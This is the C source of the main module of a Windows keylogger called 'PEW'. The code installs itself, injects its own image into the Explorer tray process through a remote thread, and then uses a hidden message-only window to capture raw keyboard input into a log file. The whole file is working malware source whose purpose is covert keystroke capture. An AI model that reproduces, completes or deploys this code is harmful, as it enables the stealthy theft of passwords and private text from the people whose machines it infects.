/* pew.c
 * PEW keylogger
 * Main module
 *  ~kny8mare@gmail.com
 */
 

#include <windows.h>
#include "../config.h"



LRESULT CALLBACK window_proc(HWND h_wnd, UINT msg, WPARAM w_param, LPARAM l_param);


/* INJECTED ENTRY POINT
 * (execution starts here in the injected thread. CreateRemoteThread calls this.
 */
DWORD WINAPI injected_thread_start(LPVOID lParam){
	
	fix_iat();		/* fix imports (coz of relocation) */
	mainCRTStartup();
	return 0;
	
}

	

/* ENTRY POINT 
 * use cl.exe /link /ENTRY:start <src file name>
 * when compiling.
 * (if compiling as a cpp pgm, add extern "C" before function declaration)
 */
void start(){
	
	save_pristine();		/* saving a clean copy of the peimage before C-runtime initializes */
	mainCRTStartup();		/* Call _mainCRTStartup to init C-runtime libs etc.. (and call main) */
}



int main(){
	
	WNDCLASSEX wnd_class_ex = {0};
	char app_name[] = APPNAME;
	HWND h_wnd;
	MSG msg;
	DWORD t_pid = 0;
	
	if( is_injected() == FALSE ){
	
		if( ! install_logger(APPINSTALLPATH) )
			return 0;
		
		while( ! GetWindowThreadProcessId(FindWindow("Shell_TrayWnd", NULL), &t_pid) )
			Sleep(250);
		
		inject_self(t_pid, (LPTHREAD_START_ROUTINE) &injected_thread_start, NULL);
		
		
	}else{
		
		/* create window */
		wnd_class_ex.cbSize = sizeof(WNDCLASSEX);
		wnd_class_ex.hInstance = (HINSTANCE)get_hmodule();
		wnd_class_ex.lpfnWndProc = (WNDPROC)window_proc;
		wnd_class_ex.lpszClassName = app_name;
		
		RegisterClassEx(&wnd_class_ex);
		
		h_wnd = CreateWindowEx( 0,
								app_name,
								NULL,
								0,
								0, 0,
								0, 0,
								HWND_MESSAGE,	/* ONLY RECEIVE MESSAGES - no GUI drawn */
								NULL,
								(HINSTANCE)get_hmodule(),
								NULL
							);

			
		while(GetMessage(&msg, NULL, 0, 0) > 0){
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
    
		return msg.wParam;
	}
	
	return 0;
}


LRESULT CALLBACK window_proc(HWND h_wnd, UINT msg, WPARAM w_param, LPARAM l_param){
	
	switch(msg){
		
		case WM_CREATE:
			register_rawidev(LOGFILEPATH, h_wnd);
			break;
			
		case WM_INPUT:
			raw_idev_handler(l_param);
			break;
			
		case WM_DESTROY:
			fin();
			PostQuitMessage(0);
			break;
			
		default:
			return DefWindowProc(h_wnd, msg, w_param, l_param);
	}
	
	return 0;
}
